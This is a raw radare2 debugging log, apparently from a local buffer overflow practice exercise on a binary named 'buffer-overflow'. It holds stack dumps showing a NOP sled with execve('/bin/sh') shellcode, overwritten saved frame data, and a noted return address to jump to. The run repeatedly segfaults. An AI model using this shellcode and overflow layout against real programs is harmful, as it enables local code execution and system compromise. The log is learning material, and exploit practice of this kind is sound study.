0x7fffffffe240  2b00 0000 0000 0000 2c00 0000 0000 0000  +.......,.......
0x7fffffffe250  0a00 0000 0000 0000 3006 4000 0000 0000  ........0.@.....
0x7fffffffe260  0004 ddf7 ff7f 0000 0000 0000 0000 0000  ................
0x7fffffffe270  0000 0000 0000 0000 e12b aaf7 ff7f 0000  .........+......
0x7fffffffe280  6047 ddf7 ff7f 0000 982f aaf7 ff7f 0000  `G......./......
0x7fffffffe290  2b00 0000                                +...

[0x00400532]> pxa/100x @rsp
    - offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
                 /rsp                                                   
0x7fffffffe230  c0f8 dcf7 ff7f 0000 23e6 ffff ff7f 0000  ........#.......
0x7fffffffe240  2b00 0000 0000 0000 2c00 0000 0000 0000  +.......,.......
0x7fffffffe250  0a00 0000 0000 0000 3006 4000 0000 0000  ........0.@.....
0x7fffffffe260  0004 ddf7 ff7f 0000 0000 0000 0000 0000  ................
0x7fffffffe270  0000 0000 0000 0000 e12b aaf7 ff7f 0000  .........+......
0x7fffffffe280  6047 ddf7 ff7f 0000 982f aaf7 ff7f 0000  `G......./......
0x7fffffffe290  2b00 0000 0000 0000 6047 ddf7 ff7f 0000  +.......`G......
0x7fffffffe2a0  3006 4000 0000 0000 0c82 a9f7 ff7f 0000  0.@.............
0x7fffffffe2b0  0000 0000 0000 0000 0000 0000 0000 0000  ................
0x7fffffffe2c0  f0e2 ffff ff7f 0000 5004 4000 0000 0000  ........P.@.....
                 /rbp                                                   
0x7fffffffe2d0  f0e2 ffff ff7f 0000 9005 4000 0000 0000  ..........@.....
0x7fffffffe2e0  d8e3 ffff ff7f 0000 0000 0000 0200 0000  ................
0x7fffffffe2f0  a005 4000 0000 0000 3ad1 a4f7 ff7f 0000  ..@.....:.......
0x7fffffffe300  0000 0000 0000 0000 d8e3 ffff ff7f 0000  ................
0x7fffffffe310  0000 0400 0200 0000 6405 4000 0000 0000  ........d.@.....
0x7fffffffe320  0000 0000 0000 0000 d2d9 7c6a 3a7f 2a53  ..........|j:.*S

[0x00400532]> pxa/200x @rsp
    - offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
                 /rsp                                                   
0x7fffffffe230  c0f8 dcf7 ff7f 0000 23e6 ffff ff7f 0000  ........#.......
0x7fffffffe240  2b00 0000 0000 0000 2c00 0000 0000 0000  +.......,.......
0x7fffffffe250  0a00 0000 0000 0000 3006 4000 0000 0000  ........0.@.....
0x7fffffffe260  0004 ddf7 ff7f 0000 0000 0000 0000 0000  ................
0x7fffffffe270  0000 0000 0000 0000 e12b aaf7 ff7f 0000  .........+......
0x7fffffffe280  6047 ddf7 ff7f 0000 982f aaf7 ff7f 0000  `G......./......
0x7fffffffe290  2b00 0000 0000 0000 6047 ddf7 ff7f 0000  +.......`G......
0x7fffffffe2a0  3006 4000 0000 0000 0c82 a9f7 ff7f 0000  0.@.............
0x7fffffffe2b0  0000 0000 0000 0000 0000 0000 0000 0000  ................
0x7fffffffe2c0  f0e2 ffff ff7f 0000 5004 4000 0000 0000  ........P.@.....
                 /rbp                                                   
0x7fffffffe2d0  f0e2 ffff ff7f 0000 9005 4000 0000 0000  ..........@.....
0x7fffffffe2e0  d8e3 ffff ff7f 0000 0000 0000 0200 0000  ................
0x7fffffffe2f0  a005 4000 0000 0000 3ad1 a4f7 ff7f 0000  ..@.....:.......
0x7fffffffe300  0000 0000 0000 0000 d8e3 ffff ff7f 0000  ................
0x7fffffffe310  0000 0400 0200 0000 6405 4000 0000 0000  ........d.@.....
0x7fffffffe320  0000 0000 0000 0000 d2d9 7c6a 3a7f 2a53  ..........|j:.*S

[0x00400532]> pxa @rsp
    - offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF                                                     
                 /rsp                                                                                                         
0x7fffffffe230  c0f8 dcf7 ff7f 0000 23e6 ffff ff7f 0000  ........#.......
0x7fffffffe240  2b00 0000 0000 0000 2c00 0000 0000 0000  +.......,.......
0x7fffffffe250  0a00 0000 0000 0000 3006 4000 0000 0000  ........0.@.....
0x7fffffffe260  0004 ddf7 ff7f 0000 0000 0000 0000 0000  ................
0x7fffffffe270  0000 0000 0000 0000 e12b aaf7 ff7f 0000  .........+......
0x7fffffffe280  6047 ddf7 ff7f 0000 982f aaf7 ff7f 0000  `G......./......
0x7fffffffe290  2b00 0000 0000 0000 6047 ddf7 ff7f 0000  +.......`G......
0x7fffffffe2a0  3006 4000 0000 0000 0c82 a9f7 ff7f 0000  0.@.............
0x7fffffffe2b0  0000 0000 0000 0000 0000 0000 0000 0000  ................
0x7fffffffe2c0  f0e2 ffff ff7f 0000 5004 4000 0000 0000  ........P.@.....
                 /rbp                                                   
0x7fffffffe2d0  f0e2 ffff ff7f 0000 9005 4000 0000 0000  ..........@.....
0x7fffffffe2e0  d8e3 ffff ff7f 0000 0000 0000 0200 0000  ................
0x7fffffffe2f0  a005 4000 0000 0000 3ad1 a4f7 ff7f 0000  ..@.....:.......
0x7fffffffe300  0000 0000 0000 0000 d8e3 ffff ff7f 0000  ................
0x7fffffffe310  0000 0400 0200 0000 6405 4000 0000 0000  ........d.@.....
0x7fffffffe320  0000 0000 0000 0000 d2d9 7c6a 3a7f 2a53  ..........|j:.*S

[0x00400532]> pxa @rsp+100
    - offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0x7fffffffe294  0000 0000 6047 ddf7 ff7f 0000 3006 4000  ....`G......0.@.
0x7fffffffe2a4  0000 0000 0c82 a9f7 ff7f 0000 0000 0000  ................
0x7fffffffe2b4  0000 0000 0000 0000 0000 0000 f0e2 ffff  ................
                                               /rbp                     
0x7fffffffe2c4  ff7f 0000 5004 4000 0000 0000 f0e2 ffff  ....P.@.........
0x7fffffffe2d4  ff7f 0000 9005 4000 0000 0000 d8e3 ffff  ......@.........
0x7fffffffe2e4  ff7f 0000 0000 0000 0200 0000 a005 4000  ..............@.
0x7fffffffe2f4  0000 0000 3ad1 a4f7 ff7f 0000 0000 0000  ....:...........
0x7fffffffe304  0000 0000 d8e3 ffff ff7f 0000 0000 0400  ................
0x7fffffffe314  0200 0000 6405 4000 0000 0000 0000 0000  ....d.@.........
0x7fffffffe324  0000 0000 d2d9 7c6a 3a7f 2a53 5004 4000  ......|j:.*SP.@.
0x7fffffffe334  0000 0000 d0e3 ffff ff7f 0000 0000 0000  ................
0x7fffffffe344  0000 0000 0000 0000 0000 0000 d2d9 3ca7  ..............<.
0x7fffffffe354  4580 d5ac d2d9 d8c0 f390 d5ac 0000 0000  E...............
0x7fffffffe364  0000 0000 0000 0000 0000 0000 0000 0000  ................
0x7fffffffe374  0000 0000 f0e3 ffff ff7f 0000 30e1 fff7  ............0...
0x7fffffffe384  ff7f 0000 e67f def7 ff7f 0000 0000 0000  ................

[0x00400532]> pxa @rsp
    - offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
                 /rsp                                                   
0x7fffffffe230  c0f8 dcf7 ff7f 0000 23e6 ffff ff7f 0000  ........#.......
0x7fffffffe240  2b00 0000 0000 0000 2c00 0000 0000 0000  +.......,.......
0x7fffffffe250  0a00 0000 0000 0000 3006 4000 0000 0000  ........0.@.....
0x7fffffffe260  0004 ddf7 ff7f 0000 0000 0000 0000 0000  ................
0x7fffffffe270  0000 0000 0000 0000 e12b aaf7 ff7f 0000  .........+......
0x7fffffffe280  6047 ddf7 ff7f 0000 982f aaf7 ff7f 0000  `G......./......
0x7fffffffe290  2b00 0000 0000 0000 6047 ddf7 ff7f 0000  +.......`G......
0x7fffffffe2a0  3006 4000 0000 0000 0c82 a9f7 ff7f 0000  0.@.............
0x7fffffffe2b0  0000 0000 0000 0000 0000 0000 0000 0000  ................
0x7fffffffe2c0  f0e2 ffff ff7f 0000 5004 4000 0000 0000  ........P.@.....
                 /rbp                                                   
0x7fffffffe2d0  f0e2 ffff ff7f 0000 9005 4000 0000 0000  ..........@.....
0x7fffffffe2e0  d8e3 ffff ff7f 0000 0000 0000 0200 0000  ................
0x7fffffffe2f0  a005 4000 0000 0000 3ad1 a4f7 ff7f 0000  ..@.....:.......
0x7fffffffe300  0000 0000 0000 0000 d8e3 ffff ff7f 0000  ................
0x7fffffffe310  0000 0400 0200 0000 6405 4000 0000 0000  ........d.@.....
0x7fffffffe320  0000 0000 0000 0000 d2d9 7c6a 3a7f 2a53  ..........|j:.*S

[0x00400532]> dr
rax = 0x7fffffffe623
rbx = 0x00000000
rcx = 0x7ffff7b0d584
rdx = 0x7ffff7dd58c0
r8 = 0x00000003
r9 = 0x00000077
r10 = 0x00000000
r11 = 0x00000246
r12 = 0x00400450
r13 = 0x7fffffffe3d0
r14 = 0x00000000
r15 = 0x00000000
rsi = 0x00602260
rdi = 0x7fffffffe623
rsp = 0x7fffffffe230
rbp = 0x7fffffffe2d0
rip = 0x00400539
rflags = 0x00000206
orax = 0xffffffffffffffff

[0x00400532]> ds
child stopped with signal 28
[+] SIGNAL 28 errno=0 addr=0x00000000 code=128 ret=0

[0x00400532]> dr
rax = 0x7fffffffe623
rbx = 0x00000000
rcx = 0x7ffff7b0d584
rdx = 0x7fffffffe623
r8 = 0x00000003
r9 = 0x00000077
r10 = 0x00000000
r11 = 0x00000246
r12 = 0x00400450
r13 = 0x7fffffffe3d0
r14 = 0x00000000
r15 = 0x00000000
rsi = 0x00602260
rdi = 0x7fffffffe623
rsp = 0x7fffffffe230
rbp = 0x7fffffffe2d0
rip = 0x00400540
rflags = 0x00000206
orax = 0xffffffffffffffff

[0x00400532]> ds

[0x00400532]> dr
rax = 0x7fffffffe240
rbx = 0x00000000
rcx = 0x7ffff7b0d584
rdx = 0x7fffffffe623
r8 = 0x00000003
r9 = 0x00000077
r10 = 0x00000000
r11 = 0x00000246
r12 = 0x00400450
r13 = 0x7fffffffe3d0
r14 = 0x00000000
r15 = 0x00000000
rsi = 0x00602260
rdi = 0x7fffffffe623
rsp = 0x7fffffffe230
rbp = 0x7fffffffe2d0
rip = 0x00400547
rflags = 0x00000206
orax = 0xffffffffffffffff

[0x00400532]> ds

[0x00400532]> dr
rax = 0x7fffffffe240
rbx = 0x00000000
rcx = 0x7ffff7b0d584
rdx = 0x7fffffffe623
r8 = 0x00000003
r9 = 0x00000077
r10 = 0x00000000
r11 = 0x00000246
r12 = 0x00400450
r13 = 0x7fffffffe3d0
r14 = 0x00000000
r15 = 0x00000000
rsi = 0x7fffffffe623
rdi = 0x7fffffffe623
rsp = 0x7fffffffe230
rbp = 0x7fffffffe2d0
rip = 0x0040054a
rflags = 0x00000206
orax = 0xffffffffffffffff

[0x00400532]> ds

[0x00400532]> dr
rax = 0x7fffffffe240
rbx = 0x00000000
rcx = 0x7ffff7b0d584
rdx = 0x7fffffffe623
r8 = 0x00000003
r9 = 0x00000077
r10 = 0x00000000
r11 = 0x00000246
r12 = 0x00400450
r13 = 0x7fffffffe3d0
r14 = 0x00000000
r15 = 0x00000000
rsi = 0x7fffffffe623
rdi = 0x7fffffffe240
rsp = 0x7fffffffe230
rbp = 0x7fffffffe2d0
rip = 0x0040054d
rflags = 0x00000206
orax = 0xffffffffffffffff

[0x00400532]> pxa @rsp
    - offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
                 /rsp                                                   
0x7fffffffe230  c0f8 dcf7 ff7f 0000 23e6 ffff ff7f 0000  ........#.......
                 /rdi                                                   
0x7fffffffe240  2b00 0000 0000 0000 2c00 0000 0000 0000  +.......,.......
0x7fffffffe250  0a00 0000 0000 0000 3006 4000 0000 0000  ........0.@.....
0x7fffffffe260  0004 ddf7 ff7f 0000 0000 0000 0000 0000  ................
0x7fffffffe270  0000 0000 0000 0000 e12b aaf7 ff7f 0000  .........+......
0x7fffffffe280  6047 ddf7 ff7f 0000 982f aaf7 ff7f 0000  `G......./......
0x7fffffffe290  2b00 0000 0000 0000 6047 ddf7 ff7f 0000  +.......`G......
0x7fffffffe2a0  3006 4000 0000 0000 0c82 a9f7 ff7f 0000  0.@.............
0x7fffffffe2b0  0000 0000 0000 0000 0000 0000 0000 0000  ................
0x7fffffffe2c0  f0e2 ffff ff7f 0000 5004 4000 0000 0000  ........P.@.....
                 /rbp                                                   
0x7fffffffe2d0  f0e2 ffff ff7f 0000 9005 4000 0000 0000  ..........@.....
0x7fffffffe2e0  d8e3 ffff ff7f 0000 0000 0000 0200 0000  ................
0x7fffffffe2f0  a005 4000 0000 0000 3ad1 a4f7 ff7f 0000  ..@.....:.......
0x7fffffffe300  0000 0000 0000 0000 d8e3 ffff ff7f 0000  ................
0x7fffffffe310  0000 0400 0200 0000 6405 4000 0000 0000  ........d.@.....
0x7fffffffe320  0000 0000 0000 0000 d2d9 7c6a 3a7f 2a53  ..........|j:.*S

[0x00400532]> ds

[0x00400430]> pxa @rsp
    - offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
                 /rsp                                                   
0x7fffffffe228  5205 4000 0000 0000 c0f8 dcf7 ff7f 0000  R.@.............
                                     /rdi                               
0x7fffffffe238  23e6 ffff ff7f 0000 2b00 0000 0000 0000  #.......+.......
0x7fffffffe248  2c00 0000 0000 0000 0a00 0000 0000 0000  ,...............
0x7fffffffe258  3006 4000 0000 0000 0004 ddf7 ff7f 0000  0.@.............
0x7fffffffe268  0000 0000 0000 0000 0000 0000 0000 0000  ................
0x7fffffffe278  e12b aaf7 ff7f 0000 6047 ddf7 ff7f 0000  .+......`G......
0x7fffffffe288  982f aaf7 ff7f 0000 2b00 0000 0000 0000  ./......+.......
0x7fffffffe298  6047 ddf7 ff7f 0000 3006 4000 0000 0000  `G......0.@.....
0x7fffffffe2a8  0c82 a9f7 ff7f 0000 0000 0000 0000 0000  ................
0x7fffffffe2b8  0000 0000 0000 0000 f0e2 ffff ff7f 0000  ................
                                     /rbp                               
0x7fffffffe2c8  5004 4000 0000 0000 f0e2 ffff ff7f 0000  P.@.............
0x7fffffffe2d8  9005 4000 0000 0000 d8e3 ffff ff7f 0000  ..@.............
0x7fffffffe2e8  0000 0000 0200 0000 a005 4000 0000 0000  ..........@.....
0x7fffffffe2f8  3ad1 a4f7 ff7f 0000 0000 0000 0000 0000  :...............
0x7fffffffe308  d8e3 ffff ff7f 0000 0000 0400 0200 0000  ................
0x7fffffffe318  6405 4000 0000 0000 0000 0000 0000 0000  d.@.............

[0x00400430]> dr
rax = 0x7fffffffe240
rbx = 0x00000000
rcx = 0x7ffff7b0d584
rdx = 0x7fffffffe623
r8 = 0x00000003
r9 = 0x00000077
r10 = 0x00000000
r11 = 0x00000246
r12 = 0x00400450
r13 = 0x7fffffffe3d0
r14 = 0x00000000
r15 = 0x00000000
rsi = 0x7fffffffe623
rdi = 0x7fffffffe240
rsp = 0x7fffffffe228
rbp = 0x7fffffffe2d0
rip = 0x00400430
rflags = 0x00000206
orax = 0xffffffffffffffff

[0x00400430]> ds
[0x00400430]> ds

[0x00400430]> dr
rax = 0x7fffffffe240
rbx = 0x00000000
rcx = 0x7ffff7b0d584
rdx = 0x7fffffffe623
r8 = 0x00000003
r9 = 0x00000077
r10 = 0x00000000
r11 = 0x00000246
r12 = 0x00400450
r13 = 0x7fffffffe3d0
r14 = 0x00000000
r15 = 0x00000000
rsi = 0x7fffffffe623
rdi = 0x7fffffffe240
rsp = 0x7fffffffe220
rbp = 0x7fffffffe2d0
rip = 0x0040043b
rflags = 0x00000206
orax = 0xffffffffffffffff

[0x00400430]> ds

[0x00400420]> dr
rax = 0x7fffffffe240
rbx = 0x00000000
rcx = 0x7ffff7b0d584
rdx = 0x7fffffffe623
r8 = 0x00000003
r9 = 0x00000077
r10 = 0x00000000
r11 = 0x00000246
r12 = 0x00400450
r13 = 0x7fffffffe3d0
r14 = 0x00000000
r15 = 0x00000000
rsi = 0x7fffffffe623
rdi = 0x7fffffffe240
rsp = 0x7fffffffe220
rbp = 0x7fffffffe2d0
rip = 0x00400420
rflags = 0x00000206
orax = 0xffffffffffffffff

[0x00400420]> ds
[0x00400420]> ds

[0x7ffff7dee3f0]> dr
rax = 0x7fffffffe240
rbx = 0x00000000
rcx = 0x7ffff7b0d584
rdx = 0x7fffffffe623
r8 = 0x00000003
r9 = 0x00000077
r10 = 0x00000000
r11 = 0x00000246
r12 = 0x00400450
r13 = 0x7fffffffe3d0
r14 = 0x00000000
r15 = 0x00000000
rsi = 0x7fffffffe623
rdi = 0x7fffffffe240
rsp = 0x7fffffffe218
rbp = 0x7fffffffe2d0
rip = 0x7ffff7dee3f0
rflags = 0x00000206
orax = 0xffffffffffffffff
[0x7ffff7dee3f0]> pdf 0x7ffff7dee3f0
p: Cannot find function at 0x7ffff7dee3f0
[0x7ffff7dee3f0]> px 0x7ffff7dee3f0
This block size is too big (0x3200000 < 0x8211c10). Did you mean 'px @ 0x7ffff7dee3f0' instead?
[0x7ffff7dee3f0]> px @0x7ffff7dee3f0
- offset -       0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0x7ffff7dee3f0  5348 89e3 4883 e4c0 482b 2509 e520 0048  SH..H...H+%.. .H                                                     
0x7ffff7dee400  8904 2448 894c 2408 4889 5424 1048 8974  ..$H.L$.H.T$.H.t
0x7ffff7dee410  2418 4889 7c24 204c 8944 2428 4c89 4c24  $.H.|$ L.D$(L.L$
0x7ffff7dee420  30b8 ee00 0000 31d2 4889 9424 4002 0000  0.....1.H..$@...
0x7ffff7dee430  4889 9424 4802 0000 4889 9424 5002 0000  H..$H...H..$P...
0x7ffff7dee440  4889 9424 5802 0000 4889 9424 6002 0000  H..$X...H..$`...
0x7ffff7dee450  4889 9424 6802 0000 4889 9424 7002 0000  H..$h...H..$p...
0x7ffff7dee460  4889 9424 7802 0000 0fae 6424 4048 8b73  H..$x.....d$@H.s
0x7ffff7dee470  1048 8b7b 08e8 0692 ffff 4989 c3b8 ee00  .H.{......I.....
0x7ffff7dee480  0000 31d2 0fae 6c24 404c 8b4c 2430 4c8b  ..1...l$@L.L$0L.
0x7ffff7dee490  4424 2848 8b7c 2420 488b 7424 1848 8b54  D$(H.|$ H.t$.H.T
0x7ffff7dee4a0  2410 488b 4c24 0848 8b04 2448 89dc 488b  $.H.L$.H..$H..H.
0x7ffff7dee4b0  1c24 4883 c418 f241 ffe3 660f 1f44 0000  .$H....A..f..D..
0x7ffff7dee4c0  5348 89e3 4883 e4c0 482b 2539 e420 0048  SH..H...H+%9. .H
0x7ffff7dee4d0  8904 2448 894c 2408 4889 5424 1048 8974  ..$H.L$.H.T$.H.t
0x7ffff7dee4e0  2418 4889 7c24 204c 8944 2428 4c89 4c24  $.H.|$ L.D$(L.L$
[0x7ffff7dee3f0]> ds
[0x7ffff7de7680]> dc
hit breakpoint at: 400552
[0x00400552]> dr
rax = 0x7fffffffe240
rbx = 0x00000000
rcx = 0x7978777675747372
rdx = 0x0000007a
r8 = 0x00000003
r9 = 0x00000077
r10 = 0x0000005e
r11 = 0x7ffff7b98320
r12 = 0x00400450
r13 = 0x7fffffffe3d0
r14 = 0x00000000
r15 = 0x00000000
rsi = 0x7fffffffe6c0
rdi = 0x7fffffffe2dd
rsp = 0x7fffffffe230
rbp = 0x7fffffffe2d0
rip = 0x00400552
rflags = 0x00000206
orax = 0xffffffffffffffff
[0x00400552]> pxa @rsp
    - offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
                 /rsp                                                   
0x7fffffffe230  c0f8 dcf7 ff7f 0000 23e6 ffff ff7f 0000  ........#.......
                 /rax                                                   
0x7fffffffe240  9090 9090 9090 9090 9090 9090 9090 9090  ................
0x7fffffffe250  9090 9090 9090 9090 9090 9090 9090 9090  ................
0x7fffffffe260  9090 9090 9090 9090 9090 9090 9090 9090  ................
0x7fffffffe270  9090 9090 9090 9090 9090 9090 9090 9090  ................
0x7fffffffe280  9090 9090 9090 9090 9090 9090 9090 9090  ................
0x7fffffffe290  9090 9090 9090 9090 9090 9090 9090 9090  ................
0x7fffffffe2a0  9090 9090 9090 9090 9090 9090 9090 48b9  ..............H.
0x7fffffffe2b0  2f62 696e 2f73 6811 48c1 e108 48c1 e908  /bin/sh.H...H...
0x7fffffffe2c0  5148 8d3c 2448 31d2 b03b 0f05 6162 6364  QH.<$H1..;..abcd
                 /rbp                            /rdi                   
0x7fffffffe2d0  6566 6768 696a 6b6c 6d6e 6f70 7172 7374  efghijklmnopqrst
0x7fffffffe2e0  7576 7778 797a 0000 0000 0000 0200 0000  uvwxyz..........
0x7fffffffe2f0  a005 4000 0000 0000 3ad1 a4f7 ff7f 0000  ..@.....:.......
0x7fffffffe300  0000 0000 0000 0000 d8e3 ffff ff7f 0000  ................
0x7fffffffe310  0000 0400 0200 0000 6405 4000 0000 0000  ........d.@.....
0x7fffffffe320  0000 0000 0000 0000 d2d9 7c6a 3a7f 2a53  ..........|j:.*S

[0x00400552]> db 0x400563
[0x00400552]> db
0x0040052b - 0x0040052c 1 --x sw break enabled cmd="" cond="" name="0x0040052b" module="/home/user1/overflow-3/buffer-overflow"
0x00400552 - 0x00400553 1 --x sw break enabled cmd="" cond="" name="0x400552" module="/home/user1/overflow-3/buffer-overflow"
0x00400563 - 0x00400564 1 --x sw break enabled cmd="" cond="" name="0x400563" module="/home/user1/overflow-3/buffer-overflow"
[0x00400552]> dc
��������������������������������������������������������������������������������������������������������������H�/bin/shH�H�QH�<$H1Ұ;abcdefghijklmnopqrstuvwxyz
hit breakpoint at: 400563

[0x00400563]> pxa @rsp
    - offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
                 /rsp                                                   
0x7fffffffe2d8  6d6e 6f70 7172 7374 7576 7778 797a 0000  mnopqrstuvwxyz..
0x7fffffffe2e8  0000 0000 0200 0000 a005 4000 0000 0000  ..........@.....
0x7fffffffe2f8  3ad1 a4f7 ff7f 0000 0000 0000 0000 0000  :...............
0x7fffffffe308  d8e3 ffff ff7f 0000 0000 0400 0200 0000  ................
0x7fffffffe318  6405 4000 0000 0000 0000 0000 0000 0000  d.@.............
0x7fffffffe328  d2d9 7c6a 3a7f 2a53 5004 4000 0000 0000  ..|j:.*SP.@.....
0x7fffffffe338  d0e3 ffff ff7f 0000 0000 0000 0000 0000  ................
0x7fffffffe348  0000 0000 0000 0000 d2d9 3ca7 4580 d5ac  ..........<.E...
0x7fffffffe358  d2d9 d8c0 f390 d5ac 0000 0000 0000 0000  ................
0x7fffffffe368  0000 0000 0000 0000 0000 0000 0000 0000  ................
0x7fffffffe378  f0e3 ffff ff7f 0000 30e1 fff7 ff7f 0000  ........0.......
0x7fffffffe388  e67f def7 ff7f 0000 0000 0000 0000 0000  ................
0x7fffffffe398  0000 0000 0000 0000 0000 0000 0000 0000  ................
0x7fffffffe3a8  5004 4000 0000 0000 d0e3 ffff ff7f 0000  P.@.............
0x7fffffffe3b8  7a04 4000 0000 0000 c8e3 ffff ff7f 0000  z.@.............
                                     /r13                               
0x7fffffffe3c8  80df fff7 ff7f 0000 0200 0000 0000 0000  ................
[0x00400563]> dr
rax = 0x000000a7
rbx = 0x00000000
rcx = 0x7ffff7b0d584
rdx = 0x7ffff7dd58c0
r8 = 0x7ffff7fef4c0
r9 = 0x00000077
r10 = 0x0000005e
r11 = 0x00000246
r12 = 0x00400450
r13 = 0x7fffffffe3d0
r14 = 0x00000000
r15 = 0x00000000
rsi = 0x00602260
rdi = 0x00000000
rsp = 0x7fffffffe2d8
rbp = 0x6c6b6a6968676665
rip = 0x00400563
rflags = 0x00000202
orax = 0xffffffffffffffff
[0x00400563]> ds
child stopped with signal 11
[+] SIGNAL 11 errno=0 addr=0x00000000 code=128 ret=0
hit breakpoint at: 400563
[0x00400563]> pxa @rsp
    - offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
                 /rsp                                                   
0x7fffffffe2d8  6d6e 6f70 7172 7374 7576 7778 797a 0000  mnopqrstuvwxyz..
0x7fffffffe2e8  0000 0000 0200 0000 a005 4000 0000 0000  ..........@.....
0x7fffffffe2f8  3ad1 a4f7 ff7f 0000 0000 0000 0000 0000  :...............
0x7fffffffe308  d8e3 ffff ff7f 0000 0000 0400 0200 0000  ................
0x7fffffffe318  6405 4000 0000 0000 0000 0000 0000 0000  d.@.............
0x7fffffffe328  d2d9 7c6a 3a7f 2a53 5004 4000 0000 0000  ..|j:.*SP.@.....
0x7fffffffe338  d0e3 ffff ff7f 0000 0000 0000 0000 0000  ................
0x7fffffffe348  0000 0000 0000 0000 d2d9 3ca7 4580 d5ac  ..........<.E...
0x7fffffffe358  d2d9 d8c0 f390 d5ac 0000 0000 0000 0000  ................
0x7fffffffe368  0000 0000 0000 0000 0000 0000 0000 0000  ................
0x7fffffffe378  f0e3 ffff ff7f 0000 30e1 fff7 ff7f 0000  ........0.......
0x7fffffffe388  e67f def7 ff7f 0000 0000 0000 0000 0000  ................
0x7fffffffe398  0000 0000 0000 0000 0000 0000 0000 0000  ................
0x7fffffffe3a8  5004 4000 0000 0000 d0e3 ffff ff7f 0000  P.@.............
0x7fffffffe3b8  7a04 4000 0000 0000 c8e3 ffff ff7f 0000  z.@.............
                                     /r13                               
0x7fffffffe3c8  80df fff7 ff7f 0000 0200 0000 0000 0000  ................
[0x00400563]> dr
rax = 0x000000a7
rbx = 0x00000000
rcx = 0x7ffff7b0d584
rdx = 0x7ffff7dd58c0
r8 = 0x7ffff7fef4c0
r9 = 0x00000077
r10 = 0x0000005e
r11 = 0x00000246
r12 = 0x00400450
r13 = 0x7fffffffe3d0
r14 = 0x00000000
r15 = 0x00000000
rsi = 0x00602260
rdi = 0x00000000
rsp = 0x7fffffffe2d8
rbp = 0x6c6b6a6968676665
rip = 0x00400563
rflags = 0x00000202
orax = 0xffffffffffffffff
[0x00400563]> ds
child stopped with signal 11
[+] SIGNAL 11 errno=0 addr=0x00000000 code=128 ret=0
hit breakpoint at: 400563
[0x00400563]> ds
child stopped with signal 11
[+] SIGNAL 11 errno=0 addr=0x00000000 code=128 ret=0
hit breakpoint at: 400563
[0x00400563]> dc
child stopped with signal 11
[+] SIGNAL 11 errno=0 addr=0x00000000 code=128 ret=0
hit breakpoint at: 400563
[0x00400563]> ds
child stopped with signal 11
[+] SIGNAL 11 errno=0 addr=0x00000000 code=128 ret=0
hit breakpoint at: 400563
[0x00400563]> dsl
--> Stepping until dwarf line
child stopped with signal 11
[+] SIGNAL 11 errno=0 addr=0x00000000 code=128 ret=0
hit breakpoint at: 400563
child stopped with signal 11
[+] SIGNAL 11 errno=0 addr=0x00000000 code=128 ret=0
hit breakpoint at: 400563
child stopped with signal 11

```
infinite loop
```sh
[+] SIGNAL 11 errno=0 addr=0x00000000 code=128 ret=0
hit breakpoint at: 400563
child stopped with signal 11
[+] SIGNAL 11 errno=0 addr=0x00000000 code=128 ret=0
hit breakpoint at: 400563
child stopped with signal 11
[+] SIGNAL 11 errno=0 addr=0x00000000 code=128 ret=0
hit breakpoint at: 400563
^CHere's a program that echo's out your input
^[[B^[[B
test
ls
hello
^C


exit
pwd

```

after strcopy
```sh
[0x00400552]> pxa @rsp
    - offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
                 /rsp                                                   
0x7fffffffe230  c0f8 dcf7 ff7f 0000 23e6 ffff ff7f 0000  ........#.......
                 /rax                                                   
0x7fffffffe240  9090 9090 9090 9090 9090 9090 9090 9090  ................
0x7fffffffe250  9090 9090 9090 9090 9090 9090 9090 9090  ................
0x7fffffffe260  9090 9090 9090 9090 9090 9090 9090 9090  ................
0x7fffffffe270  9090 9090 9090 9090 9090 9090 9090 9090  ................
0x7fffffffe280  9090 9090 9090 9090 9090 9090 9090 9090  ................
0x7fffffffe290  9090 9090 9090 9090 9090 9090 9090 9090  ................
0x7fffffffe2a0  9090 9090 9090 9090 9090 9090 9090 48b9  ..............H.
0x7fffffffe2b0  2f62 696e 2f73 6811 48c1 e108 48c1 e908  /bin/sh.H...H...
0x7fffffffe2c0  5148 8d3c 2448 31d2 b03b 0f05 6162 6364  QH.<$H1..;..abcd
                 /rbp                            /rdi                   
0x7fffffffe2d0  6566 6768 696a 6b6c 6d6e 6f70 7172 7374  efghijklmnopqrst
0x7fffffffe2e0  7576 7778 797a 0000 0000 0000 0200 0000  uvwxyz..........
0x7fffffffe2f0  a005 4000 0000 0000 3ad1 a4f7 ff7f 0000  ..@.....:.......
0x7fffffffe300  0000 0000 0000 0000 d8e3 ffff ff7f 0000  ................
0x7fffffffe310  0000 0400 0200 0000 6405 4000 0000 0000  ........d.@.....
0x7fffffffe320  0000 0000 0000 0000 d2d9 7c6a 3a7f 2a53  ..........|j:.*S
```
string starts at 0x7fffffffe240
`\x40\xe2\xff\xff\xff\x7f`

before return from the function
```sh
[0x00400563]> pxa @rsp
    - offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
                 /rsp                                                   
0x7fffffffe2d8  6d6e 6f70 7172 7374 7576 7778 797a 0000  mnopqrstuvwxyz..
0x7fffffffe2e8  0000 0000 0200 0000 a005 4000 0000 0000  ..........@.....
0x7fffffffe2f8  3ad1 a4f7 ff7f 0000 0000 0000 0000 0000  :...............
0x7fffffffe308  d8e3 ffff ff7f 0000 0000 0400 0200 0000  ................
0x7fffffffe318  6405 4000 0000 0000 0000 0000 0000 0000  d.@.............
0x7fffffffe328  d2d9 7c6a 3a7f 2a53 5004 4000 0000 0000  ..|j:.*SP.@.....
0x7fffffffe338  d0e3 ffff ff7f 0000 0000 0000 0000 0000  ................
0x7fffffffe348  0000 0000 0000 0000 d2d9 3ca7 4580 d5ac  ..........<.E...
0x7fffffffe358  d2d9 d8c0 f390 d5ac 0000 0000 0000 0000  ................
